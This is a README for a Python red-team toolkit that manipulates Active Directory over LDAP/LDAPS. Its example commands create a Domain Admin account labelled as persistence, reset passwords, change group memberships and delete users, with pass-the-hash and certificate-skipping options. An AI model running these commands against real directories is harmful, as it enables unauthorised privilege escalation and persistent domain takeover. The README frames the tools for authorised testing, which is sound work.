# AddRemoteDA.py

A lightweight toolkit of **Python 3** utilities for red‑team and lab work against Microsoft Active Directory.

* Two helpers (account creation & password reset) **require LDAPS** and default to TCP 636.
* The other three can run on **plain LDAP 389** or LDAPS – toggle with `--ssl` and change ports with `--port`.
* All scripts support clear‑text credentials **or** pass‑the‑hash, expose a `--debug` flag for step‑by‑step output, and share a consistent argument style.

> ⚠️ **Disclaimer**  
> These tools are provided **solely for authorised security‑testing and educational purposes**. You are entirely responsible for ensuring you have explicit permission to run them. The authors and maintainers accept **no liability** for misuse or damages.

---

## Script Overview

| Script (CLI name)                     | LDAPS enforced | Purpose |
| ------------------------------------- | -------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| **`add_da.py`** (`add-da`)            | **Yes**        | Create a new domain user, set a compliant password (honours normal expiry), enable the account, and add it to **Domain Admins**. |
| **`change_password.py`** (`chg-pass`) | **Yes**        | Reset the password of an existing domain account. |
| **`add_to_group.py`** (`add-to-group`) | Optional       | Add an existing user to any AD group. |
| **`remove_from_group.py`** (`remove-from-group`) | Optional | Remove an existing user from an AD group. |
| **`delete_user.py`** (`delete-user`)  | Optional       | Delete a user object from the directory. |

### Connection flags

| Flag | Applies to | Meaning |
|------|------------|---------|
| `--dc-ip <FQDN/IP>` | all | Domain Controller to target |
| `--port <num>` | all | Override default port (636 for LDAPS‑only scripts, 389 otherwise) |
| `--ssl` | add/remove‑group & delete | Connect with LDAPS instead of LDAP |
| `--insecure` | all | Skip certificate verification when using LDAPS |

Authentication flags (`--password` *or* `--hashes`), plus `--domain`, `--user`, and `--debug`, are uniform across every helper.  Each script then adds task‑specific parameters; run with `-h` for full usage.

---

## Quick Examples

```bash
# 1️⃣  Persistence: create a Domain‑Admin account (LDAPS, skip cert validation)
python3 add_da.py \
  --dc-ip dc01.corp.local --domain corp.local \
  --user svc-admin --password 'S3cr3t!' \
  --new-user pentestsvc --debug --insecure

# 2️⃣  Reset that account’s password later (LDAPS required)
python3 change_password.py \
  --dc-ip dc01.corp.local --domain corp.local \
  --user svc-admin --password 'S3cr3t!' \
  --target-user pentestsvc --new-pass 'N3w!Passw0rd' --insecure

# 3️⃣  Add a normal user to Remote Desktop Users over plain LDAP
python3 add_to_group.py \
  --dc-ip dc01.corp.local --domain corp.local --port 389 \
  --user svc-admin --hashes aad3b4...:6216d3... \
  --target-user analyst1 --target-group "Remote Desktop Users"

# 4️⃣  Remove that user again (switch to LDAPS with cert checking)
python3 remove_from_group.py \
  --dc-ip dc01.corp.local --domain corp.local --ssl \
  --user svc-admin --password 'S3cr3t!' \
  --target-user analyst1 --target-group "Remote Desktop Users"

# 5️⃣  Tear down the persistence account entirely
python3 delete_user.py \
  --dc-ip dc01.corp.local --domain corp.local --ssl --insecure \
  --user svc-admin --password 'S3cr3t!' \
  --target-user pentestsvc
```

---

## Requirements

* Python ≥ 3.8
* `ldap3` ≥ 2.10.2

```bash
python -m pip install --upgrade ldap3
```

No other third‑party packages are required.

---

## License

Released under the **MIT License** – see [`LICENSE`](LICENSE) for details.
